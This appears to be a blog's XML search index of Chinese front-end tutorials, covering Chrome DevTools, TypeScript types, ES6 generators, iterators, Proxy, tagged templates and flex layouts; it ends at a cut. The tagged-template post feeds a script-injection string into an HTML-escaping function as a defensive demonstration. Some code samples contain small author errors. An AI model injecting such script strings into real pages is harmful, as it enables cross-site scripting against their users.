&#125; 这样就能只管看出某个方法具体被调用了多少遍，注意次数和程序无关，只和 console.count 被调用多少次有关，即如果页面不刷新，继续执行，次数会累加。 console.error和console.warn console.error 输出错误日志，红色显示 console.warn 输出警告日志，黄色显示 12console.error('a error message!');console.warn('a warn message!'); console.time和console.timeEnd组合 先输出 console.time() 在输出 console.timeEnd()，输出的时间即为中间语句的执行时间 1234console.time()setTimeout(() =&gt; &#123; console.timeEnd()&#125;, 2000) 注意：setTimeout只是表示延迟执行，具体间隔时间与语句的执行时间也有关系，并非严格意义上的2s。 console.clear清空log 使用 console.clear() 可以清空所有的log console.group或groupCollapsed输出分组信息 console.group() 输出分组信息，以groupEnd结尾，默认展开。 console.groupCollapsed() 同group，默认折叠。 1234console.group('开始log')console.log('1')console.log('2') console.groupEnd() console.table表格信息 console.table() 方法用于在控制台输出表格信息。 第一个参数是必需的，且对象类型需要是对象或数组，对应的数据会填充到表格中。 第二个参数可选，可指定需要输出的表头名，默认全部输出。 打印数组： 1console.table(["Google", "Runoob", "Taobao"]); 打印对象： 1console.table(&#123; name : "菜鸟教程", site : "www.runoob.com" &#125;); 打印对象数组： 1234var site1 = &#123; name : "Runoob", site : "www.runoob.com" &#125;var site2 = &#123; name : "Google", site : "www.google.com" &#125;var site3 = &#123; name : "Taobao", site : "www.taobao.com" &#125;console.table([site1, site2, site3]); 第二个参数可指定需要输出的表头名，默认全部输出 1234567var site1 = &#123; name : "Runoob", site : "www.runoob.com" &#125;var site2 = &#123; name : "Google", site : "www.google.com" &#125;var site3 = &#123; name : "Taobao", site : "www.taobao.com" &#125;console.table([site1, site2, site3], ["name"]);console.table([site1, site2, site3], ["site"]);console.table([site1, site2, site3], ["name", "site"]); Dom断点调试 比如页面有一个p标签和两个按钮，一个按钮的功能为修改p段落样式，一个按钮的功能为删除p段落，通过在Dom上添加断点来定位到相应的js代码。 鼠标选中元素，找到Dom节点位置 右键选择 Break on，选择 attributes modifications 当我们点击按钮的时候，会自动帮我们定位到js中的代码位置断点同理，选择 node removal，既可以在元素删除的时候断点 Dom绑定事件断点调试 上一个方法我们介绍了如何给Dom断点调试，但是该方法仅支持调试属性修改和节点删除事件。下面我们介绍如何给Dom绑定的时候进行断点，差点执行流程。 鼠标选中元素，在 Elements 一栏打开 Event Listeners 知道绑定的方法，以 click 方法为例，展开该方法 找到引用的js文件并打开 这样就找到了该Dom元素对应的click方法 然后我们就可以设置相应的断点，进行单步调试了 错误断点调试 当我们的js遇到错误的时候，有的时候我们可以通过错误信息后面的js来定位到错误的地方。下面介绍一下另外一种方法： 打开开发者工具，切换到source面板 点击 Pause on exceptions，勾选 Pause on caught exceptions 刷新页面，这个时候页面会自动在发生错误的位置增加断点 控制台代码手动添加debug 比如我们需要在控制台测试我们编写的某一段代码，且需要在代码执行的时候添加debug断点，除了手动在代码中添加debugger外，还可以这样： 也可以用于给当前页面的全局方法添加断点 123456function test() &#123; console.log('I need debug!');&#125;debug(test)test() 控制台拷贝对象 在打印的对象上右键，找到 Store as global variable，此时会自动输出一个temp1的全局变量，手动执行 copy(temp1) 就可以复制到剪切板了。 控制台$符号 在chrome中，除了使用 document.getElementById 系列方法或 document.querySelector 系列方法外，还可以使用 $ 来选择元素，注意此 $ 并不等同于jQuery中的 $。 假设有个这样的结构： 123&lt;p id="para"&gt;Hello World&lt;/p&gt;&lt;button onclick="changeColor()"&gt;修改颜色&lt;/button&gt;&lt;button onclick="deleteDom()"&gt;删除元素&lt;/button&gt; 通过$也可以选择p和button 1234567$('p') // &lt;p id="para"&gt;Hello World&lt;/p&gt;$('button') // &lt;button onclick="changeColor()"&gt;修改颜色&lt;/button&gt;// $ 方法的效果相当于 document.querySelector()，获取单个元素，如果存在多个，返回第一个元素$$('p') // [p]$$('button') // [button, button]// $$ 方法的效果相当于 document.querySelectorAll()，获取多个元素，返回数组 调试nodejs程序 通常我们在执行node程序的时候，会这样操作，这样的话我们只能使用命令行工具来进行debug： 1node app.js 我们也可以这样启动命令： 1node --inspect-brk app.js 启动完成之后，我们使用chrome打开任意一个页面，打开开发者工具，开发者工具会自动多出一个测试node的工具，点击这个就可以在chrome中debug了。 chrome充当编辑器 打开开发者工具，切换到source面板 选择 Filesystem ，如果看不见，点击后面的箭头展开，点击 Add floder to workspace 选择本地磁盘的文件夹 然后就可以在chrome上操作文件了，保存的时候会自动同步到本地磁盘 如果是html文件，可以右键 Copy link address 到地址栏打开 保存代码片段 我们可以在chrome中保存一些常用的代码片段，来减少我们重复性的输入 打开开发者工具，切换到source面板 选择 Snippets ，如果看不见，点击后面的箭头展开，点击 New Snippet 添加自己的代码片段 假设我们添加一个名为localstorage的代码片段，如： 快捷键 command + p，在搜索框中输入 ！，会列出所有的代码片段，选择相应的执行即可 这个时候就会在控制台执行相应的代码，如 动画检查器 假设我们实现了一个动画的效果，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; *&#123; margin: 0; padding: 0; &#125; .run&#123; width: 100px; height: 100px; background-color: #ccc; display: flex; justify-content: center; align-items: center; &#125; .run.ani&#123; animation: runAni 1s linear infinite; &#125; @keyframes runAni &#123; 0% &#123; transform: translate(0, 0); &#125; 50% &#123; transform: translate(300px, 0); &#125; 100% &#123; transform: translate(0px, 0); &#125; &#125; .btn&#123; width: 50px; height: 30px; border: 1px solid #ccc; display: flex; justify-content: center; align-items: center; margin-top: 50px; cursor: pointer; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="run"&gt;running&lt;/div&gt; &lt;div class="btn" onclick="startRun()"&gt;开始&lt;/div&gt; &lt;script&gt; var box = document.querySelector('.run') function startRun() &#123; box.classList.add('ani'); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当PM过来验收的时候觉得动画时间不太满意，这个时候我们可能需要不停的修改代码，让PM去看哪个时间比较OK。相对来说会比较烦，我们可以通过chrome字自带的动画检查器来控制动画。 流程如下： 打开开发者工具 快捷键 command + shift + p (或 command + p，再输入&gt;)，输入 Show Animations 会多出一个窗口显示Animation，运行动画（按钮触发或刷新页面）会抓取到动画，点击查看详细动画 每一个线段即为一个动画周期，节点即为keyframes的节点 这个时候就可以让PM自己来拖动，选择合适的动画时间了 性能监控 打开开发者工具 快捷键 command + shift + p (或 command + p，再输入&gt;)，输入 Show Performace Monitor 会多出一个窗口显示网页性能Performace 通过分析这些指标来了解网页的性能 定位代码的内存泄漏 查看视频、查看视频]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[console打印对象时奇怪的现象]]></title>
    <url>%2Fblog%2Fjavascript%2Fconsole%E6%89%93%E5%8D%B0%E5%AF%B9%E8%B1%A1%E6%97%B6%E5%A5%87%E6%80%AA%E7%9A%84%E7%8E%B0%E8%B1%A1.html</url>
    <content type="text"><![CDATA[在console执行这一段代码12345678var obj = &#123; a: 1, b: 2, c: 3&#125;console.log(obj)obj.a = 11console.log(obj) 如下图： 但是当我们展开第一个输出的对象时，会返现一个奇怪的现象，里面的a从1变成了11 原因：在执行console.log的时候，chrome会对变量obj求一次值，输出到控制台。当点击展开时，又会继续对这个变量求一次值，显示它的属性，但是这个因为这个时候对象引用的值已经改变了，所以会显示新的值。 如果需要详细的看出前后的变化，可以使用 JSON.stringify(obj) 来打印obj。 再额外介绍一个小功能：当我们需要复制控制台输出的对象时，可以右键对象，点击出现的 Store as global variable，控制台会自动出现一个temp1的全局变量，执行 copy(temp1) 就可以复制到剪切板了。]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[typescript基本数据类型]]></title>
    <url>%2Fblog%2Ftypescript%2Ftypescript%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html</url>
    <content type="text"><![CDATA[JavaScript基本数据类型 ES5:undefined、null、string、number、boolean、object ES6新增：symbol TypeScript基本数据类型sting字符串、number数值、boolean布尔值array数组、tuple元组enum枚举、any任意undefined、nullvoid、never string类型类型1const str: string = 'abc' number数值类型1const num: number = 1 boolean布尔值类型1const flag: boolean = true array数组类型数组中所有元素是同一种数据类型1234567// 1. 在元素类型后面带上[]const arr1: number[] = [1, 2, 3]const arr2: string[] = ['a', 'b', 'c']// 2. 使用数组泛型 Array&lt;元素类型&gt;const arr3: Array&lt;number&gt; = [1, 2, 3]const arr4: Array&lt;string&gt; = ['a', 'b', 'c'] tuple元组属于数组的一种，可定义不同类型的元素1const tumple1: [number, string] = [1, '2'] enum枚举类型1234567891011121314// 默认从0开始编号enum Color &#123;Red, Green, Blue&#125; // 0、1、2const color: Color = Color.Red// 全部自定义编号enum Color2 &#123;Red = 2, Green = 4, Blue = 6&#125; // 2、4、6const color2: Color2 = Color2.Red// 部分自定义标号（自定义的前面为默认标号，自定义的后面+1）enum Color3&#123;Red, Green = 3, Blue, Pink&#125; // 0、3、4、5const color3: Color3 = Color3.Pink// 由枚举的值得到它的名字const index2: string = Color2[2] any任意类型定义之后可任意变化类型12345678let any1: any = 1any1 = '2'any1 = trueany1 = null// 如：const title: any = document.getElementById('title')title.style.color = 'red' undefined和null所有类型的子类型，常用于联合类型中12345678const u: undefined = undefinedconst n: null = null// 联合类型let num2: number | undefined | nullnum2 = 1num2 = undefinednum2 = null void没有任何类型，与any类型相反，一般用于定义方法的时候方法没有返回值12345678function tip (): void &#123; console.log('Your operation may be make a msitake, Please check')&#125;// 假设方法有返回值，则不能使用voidfunction getData (name: string = 'TypeScript'): string &#123; return `Hello $&#123;name&#125;`&#125; nevernever类型是其他类型的子类型，表示的是那些永不存在的值的类型。never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型。变量也可能是 never类型，当它们被永不为真的类型保护所约束时。123456789101112function error (message: string): never &#123; throw new Error(message)&#125;function infiniteLoop(): never &#123; while (true) &#123; &#125;&#125;如：var never1: never;never1 = 1; // 报错]]></content>
      <tags>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6-generator函数]]></title>
    <url>%2Fblog%2Fes6%2Fes6-generator%E5%87%BD%E6%95%B0.html</url>
    <content type="text"><![CDATA[参考：http://es6.ruanyifeng.com/#docs/generator 概述Generator 函数的两大特征：*、yield（产出）。 Generator 函数的表示法：1234function * foo(x, y) &#123; yield 'hello' &#125;function *foo(x, y) &#123; yield 'hello' &#125;function* foo(x, y) &#123; yield 'hello' &#125;function*foo(x, y) &#123; yield 'hello' &#125; 通常将 * 号紧跟在 function 关键字的后面，即：1function* foo(x, y) &#123; ··· &#125; 例：1234567function* helloWorld() &#123; yield 'hello'; yield 'world'; return 'ending';&#125;var hw = helloWorld(); 上面代码定义了一个 Generator 函数helloWorld，它内部有两个 yield 表达式（hello和world），即该函数有三个状态：hello，world 和 return 语句（结束执行）。 Generator 函数的调用和普通的函数一样在函数名后面加括号，但是不同的是，调用之后不会立即执行，而是指向内部状态的指针对象。需要和 Iterator 一样调用 next 方法。每调用一次 next 方法。每调用一次，指针移动一次，直到遇到 yield 或 return 才停下来这一步，并且返回一个done来标识是否完全停止。 上例中调用 next：1234567hw.next() // &#123;value: "hello", done: false&#125;hw.next() // &#123;value: "world", done: false&#125;hw.next() // &#123;value: "ending", done: true&#125;hw.next() // &#123;value: undefined, done: true&#125; 由于 yield 可以起到暂停执行的操作，因此可以利用该特性实现异步操作。完整逻辑如下： （1）遇到 yield 关键字，就暂停执行后面的操作。并将紧跟在 yield 后面的表达式的值，作为返回对象的value值返回。 （2）下一次调用 next 方法，再继续往下执行，知道遇到下一个 yeild 表达式。 （3）如果没有遇到 yield 表达式，就一直运行到函数结束，直到 return 为止。 （4）如果没有 return，则返回的对象的value值为 undefined。 需要注意的是，yield 后面的表达式，只有在调用 next 方法，内部指针指到这一句时，才会执行这条语句。如：12345function* gen() &#123; console.log(123) console.log(456) yield 123 + 456 // 只有调用next方法指到该行时，才会执行 123+456&#125; 当然，Generator 函数也可以不搭配 yield 使用，这样就变成了一个简单的暂缓函数。如：12345678function* f() &#123; console.log('执行了！')&#125;var generator = f()setTimeout(function () &#123; generator.next() // "执行了！"&#125;, 2000); yield 关键字只能用在 Generator 函数中，用在普通函数里面会报错。1234function test() &#123; yield 1;&#125;// Uncaught SyntaxError: Unexpected number for…of循环for...of 循环可以自动遍历 Generator 函数运行时生成的 Iterator 对象，且此时不再需要调用next方法。12345678910111213function* foo() &#123; yield 1; yield 2; yield 3; yield 4; yield 5; return 6;&#125;for (let v of foo()) &#123; console.log(v);&#125;// 1 2 3 4 5 使用 for...of 循环，依次显示 5 个yield表达式的值。一旦 next 方法返回的值是 true，就会停止循环，且不包含该返回对象，即不包含 return 语句的6。 Generator.prototype.throw()Generator 函数返回的遍历器对象，都有一个throw方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。12345678910111213141516171819var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log('内部捕获', e); &#125;&#125;;var i = g();i.next();try &#123; i.throw('a'); i.throw('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 内部捕获 a// 外部捕获 b 特殊情况1：注意不要混淆 Generator.prototype.throw() 和全局的 throw 方法。将上面的 throw 改用全局方法，则会在函数体外的 catch 语句中捕获。123456789101112131415161718var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log('内部捕获', e); &#125;&#125;;var i = g();i.next();try &#123; i.throw('a'); i.throw('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 外部捕获 a 特殊情况2：如果 Generator 函数中没有try…catch语句，在外面调用 Generator.prototype.throw()，则会被外部的 try...catch 捕获。如：1234567891011121314var g = function* () &#123; yield;&#125;;var i = g();i.next();try &#123; i.throw('a'); i.throw('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 外部捕获 a 特殊情况3：如果内部外部都没有 try...catch，则会报错。1234567var g = function* () &#123; yield;&#125;;var i = g();i.next();i.throw(); // Uncaught undefined Generator.prototype.return()Generator 函数返回的遍历器对象，还有一个 return 方法，可以返回给定的值，并且终结遍历 Generator 函数。1234567891011function* gen() &#123; yield 1; yield 2; yield 3;&#125;var g = gen();g.next() // &#123; value: 1, done: false &#125;g.return('foo') // &#123; value: "foo", done: true &#125;g.next() // &#123; value: undefined, done: true &#125;]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6-iterator遍历器]]></title>
    <url>%2Fblog%2Fes6%2Fes6-iterator%E9%81%8D%E5%8E%86%E5%99%A8.html</url>
    <content type="text"><![CDATA[参考：http://es6.ruanyifeng.com/#docs/iterator JavaScript 原有的表示“集合”的数据结构，主要是数组（Array）和对象（Object），ES6 又添加了 Map 和 Set。 遍历器（Iterator）是一种访问机制，只要部署了 Iterator 接口，就可以完成遍历操作。 Iterator 的作用有三个： 为各种数据结构，提供一个统一的、简便的访问接口； 使得数据结构的成员能够按某种次序排列； ES6 创造了一种新的遍历命令 for…of 循环，Iterator 接口主要供 for…of 消费。 Iterator 的遍历过程是这样的。 （1）创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。 （2）第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员。 （3）第二次调用指针对象的next方法，指针就指向数据结构的第二个成员。 （4）不断调用指针对象的next方法，直到它指向数据结构的结束位置。 原生具备 Iterator 遍历接口的数据结构如下 Array String Map Set TypedArray 函数的 arguments 对象 NodeList 对象 以数组Array为例，内部共有 Symbol.iterator、keys、values、entries这几种遍历器：12345678910111213141516171819202122232425262728293031323334353637383940414243const colors = ['red', 'green', 'blue']// Symbol遍历器const iterator1 = colors[Symbol.iterator]() // Array Iterator &#123;&#125;// 调用next()，返回相应的元素值，直到done为trueconsole.log(iterator1.next()) // &#123;value: "red", done: false&#125;console.log(iterator1.next()) // &#123;value: "green", done: false&#125;console.log(iterator1.next()) // &#123;value: "blue", done: false&#125;console.log(iterator1.next()) // &#123;value: undefined, done: true&#125;console.log(iterator1.next()) // &#123;value: undefined, done: true&#125;console.log('--分割线--')// values遍历器（同Symbil.iterator）const iterator2 = colors.values() // Array Iterator &#123;&#125;// 调用next()，返回相应的元素值，直到done为trueconsole.log(iterator2.next()) // &#123;value: "red", done: false&#125;console.log(iterator2.next()) // &#123;value: "green", done: false&#125;console.log(iterator2.next()) // &#123;value: "blue", done: false&#125;console.log(iterator2.next()) // &#123;value: undefined, done: true&#125;console.log(iterator2.next()) // &#123;value: undefined, done: true&#125;console.log('--分割线--')// keys遍历器const iterator3 = colors.keys() // Array Iterator &#123;&#125;// 调用next()，返回相应的索引，直到done为trueconsole.log(iterator3.next()) // &#123;value: 0, done: false&#125;console.log(iterator3.next()) // &#123;value: 1, done: false&#125;console.log(iterator3.next()) // &#123;value: 2, done: false&#125;console.log(iterator3.next()) // &#123;value: undefined, done: true&#125;console.log(iterator3.next()) // &#123;value: undefined, done: true&#125;console.log('--分割线--')// entries遍历器const iterator4 = colors.entries() // Array Iterator &#123;&#125;// 调用next()，返回相应的索引和元素组成的数组，直到done为trueconsole.log(iterator4.next()) // &#123;value: [0, "red"], done: false&#125;console.log(iterator4.next()) // &#123;value: [1, "green"], done: false&#125;console.log(iterator4.next()) // &#123;value: [2, "blue"], done: false&#125;console.log(iterator4.next()) // &#123;value: undefined, done: true&#125;console.log(iterator4.next()) // &#123;value: undefined, done: true&#125; 当然我们可以自己编写遍历器，比如我们编写一个 values2 遍历器，实现 values 遍历器的功能：12345678910111213141516171819202122Array.prototype.values2 = function () &#123; let i = 0; let items = this; return &#123; next() &#123; const done = i &gt;= items.length; const value = done ? undefined : items[i++] return &#123; value, done &#125; &#125; &#125;&#125;const iterator5 = colors.values2() // Array Iterator &#123;&#125;// 调用next()，返回相应的元素值，直到done为trueconsole.log(iterator5.next()) // &#123;value: "red", done: false&#125;console.log(iterator5.next()) // &#123;value: "green", done: false&#125;console.log(iterator5.next()) // &#123;value: "blue", done: false&#125;console.log(iterator5.next()) // &#123;value: undefined, done: true&#125;console.log(iterator5.next()) // &#123;value: undefined, done: true&#125; 同理，通过查找new String().__proto__可发现，String拥有Symbol.iterator遍历器通过查找new Map().__proto__可发现，Map拥有Symbol.iterator、keys、values、entries通过查找new Set().__proto__可发现，Set拥有Symbol.iterator、keys、values、entries通过查找document.querySelectorAll(‘li’).__proto__可发现，NodeList拥有Symbol.iterator、keys、values、entries]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6-proxy方法]]></title>
    <url>%2Fblog%2Fes6%2Fes6-proxy%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[参考：http://es6.ruanyifeng.com/#docs/proxy 概述Proxy 用于修改某些操作的默认行为。 Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写。Proxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，可以译为“代理器”。 1234567891011121314151617181920212223var obj = new Proxy(&#123;&#125;, &#123; get: function (target, propKey, receiver) &#123; console.log(`getting $&#123;propKey&#125;!`); return Reflect.get(target, propKey, receiver); &#125;, set: function (target, propKey, value, receiver) &#123; console.log(`setting $&#123;propKey&#125;!`); return Reflect.set(target, propKey, value, receiver); &#125;&#125;);/** * get: * target: 目标对象 * propKey: 访问的属性 * receiver: Proxy实例 * * set: * target: 目标对象 * propKey: 访问的属性 * value: 设置的新值 * receiver: Proxy实例 */ 上面代码对一个空对象架设了一层拦截，重定义了属性的读取（get）和设置（set）行为。1234567obj.count = 1// setting count!obj.count += 1// getting count!// setting count!// 2 ES6 原生提供 Proxy 构造函数，用来生成 Proxy 实例。1234567var proxy = new Proxy(target, handler);/** * new Proxy()表示生成一个Proxy实例 * harget参数表示所要拦截的目标对象 * handler参数也是一个对象，用来定制拦截行为。 */ 当然，我们也可以拦截读取属性：123456789var proxy = new Proxy(&#123;&#125;, &#123; get: function(target, propKey) &#123; return 35; &#125;&#125;);proxy.time // 35proxy.name // 35proxy.title // 35 拦截元素返回35，所以无法访问哪个属性，都返回35。 Vue3.0 里面的监听器（Observer）由 Object.defineProperty 改用 Proxy，解决了增加或删除属性、修改数组某一项值的双向绑定问题。]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6-标签模板]]></title>
    <url>%2Fblog%2Fes6%2Fes6-%E6%A0%87%E7%AD%BE%E6%A8%A1%E6%9D%BF.html</url>
    <content type="text"><![CDATA[ES6模板字符串ES5 中拼接字符串是这样做的:1234var name = 'ZhangSan';var age = 20;console.log("My name is " + name + ", my age is " + age); 使用 ES6 模板字符串的字符串很简单：1234const name = 'ZhangSan';const age = 20;console.log(`My name is $&#123;name&#125;, my age is $&#123;age&#125;`); 特别是在创建html元素的时候更加方便，ES5中：12345678910var name = 'ZhangSan';var age = 20;var sex = 'male'var messageHTML = "&lt;div&gt;" + "&lt;p&gt;name: " + name + "&lt;/p&gt;" + "&lt;p&gt;age: " + age + "&lt;/p&gt;" + "&lt;p&gt;sex: " + male + "&lt;/p&gt;" + "&lt;/div&gt;" ES6中：12345678910const name = 'ZhangSan';const age = 20;const sex = 'male'const messageHTML = `&lt;div&gt; &lt;p&gt;name: $&#123;name&#125;&lt;/p&gt; &lt;p&gt;age: $&#123;age&#125;&lt;/p&gt; &lt;p&gt;sex: $&#123;male&#125;&lt;/p&gt; &lt;/div&gt;` 标签模板示例下面开始介绍标签模板，也是使用1`` 模板字符串跟在一个函数名后面，表示作为函数的参数，如：1alert`hello` // 相当于调用 alert('hello') 继续看一点复杂的，实现高亮一个字符串中的两个变量值 user、topic12345678const user = 'Peter'const topic = 'Learn to use markdown'const sentence = highlight`$&#123;user&#125; has commented on your topic $&#123;topic&#125;`function highlight() &#123; return 'Hello world'&#125;console.log(sentence) // 'Hello world' 可以看出标签模板的输出是由函数的return语句决定的，所以想高亮字符串中的字符，需要去修改函数的返回值12345678910111213const user = 'Peter'const topic = 'Learn to use markdown'const sentence = highlight`$&#123;user&#125; has commented on your topic $&#123;topic&#125;`function highlight(strings, ...values) &#123; // 此处从第二个参数开始使用rest方式以数组的形式获取剩余的参数 console.log(strings) // ["", " has commented on your topic ", ""] console.log(values) // ["Peter", "Learn to use markdown"] return 'Hello world' // 我们可以看出第一个参数默认为字符串被变量拆分所剩下的字符串组成的数组，后面的参数为变量&#125;console.log(sentence) // 'Hello world' 获取函数参数后，改造返回值：12345678910111213141516const user = 'Peter'const topic = 'Learn to use markdown'const sentence = highlight`$&#123;user&#125; has commented on your topic $&#123;topic&#125;`document.body.innerHTML = sentence // 再搭配hightlight样式即可function highlight(strings, ...values) &#123; const hignlighted = values.map(value =&gt; `&lt;span class="hightlight"&gt;$&#123;value&#125;&lt;/span&gt;`) // let str = '' // strings.forEach((string, i) =&gt; str += `$&#123;string&#125;$&#123;hignlighted[i] || ''&#125;`) // 此处很巧妙的将两个数组又拼合在一起，需要注意最后一个hignlighted[i]为undefined，因为values.length始终比strings.length小1 // return str // 此处也可以使用reduce来拼合，参数1为fn，参数2为起始值 // console.log([1, 2, 3, 4].reduce((prev, cur, i) =&gt; prev + cur, 0)) // 10 return strings.reduce((prev, cur, i) =&gt; `$&#123;prev&#125;$&#123;cur&#125;$&#123;hignlighted[i] || ''&#125;`, '')&#125; 最终sentence输出为：1&lt;span class="hightlight"&gt;Peter&lt;/span&gt; has commented on your topic &lt;span class="hightlight"&gt;Learn to use markdown&lt;/span&gt; 标签模板重要用途 过滤 HTML 字符串，防止用户输入恶意内容。 123456789101112131415161718let message =SaferHTML`&lt;p&gt;$&#123;sender&#125; has sent you a message.&lt;/p&gt;`;function SaferHTML(templateData) &#123; let s = templateData[0]; for (let i = 1; i &lt; arguments.length; i++) &#123; let arg = String(arguments[i]); // Escape special characters in the substitution. s += arg.replace(/&amp;/g, "&amp;amp;") .replace(/&lt;/g, "&amp;lt;") .replace(/&gt;/g, "&amp;gt;"); // Don't escape special characters in the template. s += templateData[i]; &#125; return s;&#125; 上面代码中，sender变量往往是用户提供的，经过 SaferHTML 函数处理，里面的特殊字符都会被转义。 12345let sender = '&lt;script&gt;alert("abc")&lt;/script&gt;'; // 恶意代码let message = SaferHTML`&lt;p&gt;$&#123;sender&#125; has sent you a message.&lt;/p&gt;`;message// &lt;p&gt;&amp;lt;script&amp;gt;alert("abc")&amp;lt;/script&amp;gt; has sent you a message.&lt;/p&gt; 多语言转换（国际化处理） 12i18n`Welcome to $&#123;siteName&#125;, you are visitor number $&#123;visitorNumber&#125;!`// "欢迎访问xxx，您是第xxxx位访问者！"]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器模式compatMode]]></title>
    <url>%2Fblog%2Fjavascript%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%BC%8FcompatMode.html</url>
    <content type="text"><![CDATA[浏览器有两种模式 标准（严格）模式html开头设置&lt;!DOCTYPE html&gt; 怪异（混杂）模式html开头无DOCTYPE或&lt;!DOCTYPE&gt; 如何判断浏览器当前的模式document.compatMode 可判断模式类型： 值为 CSS1Compat：标准模式 值为 BackCompat：怪异模式 不同模式下，js的方法有可能不同，如： 标准模式：浏览器可视宽度：document.documentElement.clientWidth浏览器可视高度：document.documentElement.clientHeight 怪异模式：浏览器可视宽度：document.body.clientWidth浏览器可视高度：document.body.clientHeight]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js最大安全整数]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%AE%89%E5%85%A8%E6%95%B4%E6%95%B0.html</url>
    <content type="text"><![CDATA[Number.isSafeInteger(testValue) 判断是否是安全整数 Number.MAX_SAFE_INTEGER 常量表示在 JavaScript 中最大的安全整数（2^53 - 1） Number.MIN_SAFE_INTEGER 常量表示在 JavaScript 中最小的安全整数 (-(2^53 - 1)) Number.MAX_VALUE 属性表示在 JavaScript 里所能表示的最大数值 Number.MIN_VALUE 属性表示在 JavaScript 里所能表示的最小数值 JavaScript中规定安全表示数字的范围为：[-(2^53 - 1), 2^53 - 1]，即 [-(Math.pow(2, 53) - 1), Math.pow(2, 53) - 1]，安全的意思是能够准确的表示整数和正确的比较整数。123456Number.isSafeInteger(9007199254740991) // trueNumber.isSafeInteger(9007199254740992) // falseNumber.MAX_SAFE_INTEGER // 9007199254740991Number.MIN_SAFE_INTEGER // -9007199254740991Number.MAX_VALUE // 1.7976931348623157e+308 即 1.7976931348623157 * 10 ^ (+308)Number.MIN_VALUE // 5e-324 即 5 * 10^(-324) 12console.log(9007199254740993) // 90071992547409929007199254740991 + 1 === 9007199254740991 + 2 // true 当要对超大整数进行加法运算时，使用 + 是无法达到的，一旦超过 Number.MAX_SAFE_INTEGER，数字计算可能会出现异常，建议改成后端下发。]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flex布局自适应]]></title>
    <url>%2Fblog%2Fcss%2Fflex%E5%B8%83%E5%B1%80%E8%87%AA%E9%80%82%E5%BA%94.html</url>
    <content type="text"><![CDATA[以下只介绍一些flex布局容易忽略但是却很有必要的用法，不介绍兼容性，可使用autoprefixer来解决。 场景1：左侧固定，右侧自适应，三列布局类似 1234&lt;div class="box"&gt; &lt;div class="left"&gt;left&lt;/div&gt; &lt;div class="right"&gt;right&lt;/div&gt;&lt;/div&gt; 12345678910111213.box&#123; display: flex;&#125;.left&#123; width: 100px; height: 100px; background-color: red;&#125;.right&#123; height: 100px; background-color: green; flex: 1; /* 自适应 */&#125; 场景2：左右固定，中间自适应，中间内容超长对左侧造成自动放缩 12345&lt;div class="box"&gt; &lt;div class="left"&gt;left&lt;/div&gt; &lt;div class="center"&gt;center、center、center、center、center、center、center、center、center、&lt;/div&gt; &lt;div class="right"&gt;right&lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021.box&#123; display: flex;&#125;.left&#123; width: 100px; height: 100px; background-color: red; flex-shrink: 0; /* 不会因为其他元素的超长而造成自动放缩 */&#125;.center&#123; height: 100px; word-break: break-all; background-color: green; flex: 1; /* 自适应 */&#125;.right&#123; width: 100px; height: 100px; background-color: blue; flex-shrink: 0; /* 不会因为其他元素的超长而造成自动放缩 */&#125; 场景3：左右固定，中间自适应，中间内容超出单行省略 1234567&lt;div class="box"&gt; &lt;div class="left"&gt;left&lt;/div&gt; &lt;div class="right"&gt; &lt;div class="left2"&gt;时代峻峰肯定是家乐福凯迪拉克接口路径困了就睡地方看时空裂缝决定是否就是点击神鼎飞丹砂立刻就飞快的数据分开及身份&lt;/div&gt; &lt;div class="right2"&gt;right2&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031.box&#123; display: flex;&#125;.left&#123; width: 100px; height: 200px; background-color: red; flex-shrink: 0;&#125;.right&#123; height: 200px; background-color: blue; flex-shrink: 0; display: flex; flex: 1; width: 0; /*设置width后，可以清楚flex布局的影响*/&#125;.left2&#123; height: 100px; word-break: break-all; background-color: green; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;&#125;.right2&#123; width: 100px; height: 100px; background-color: pink;&#125; 未完待续…]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue使用自定义指令解决iOS微信端input失焦回弹问题]]></title>
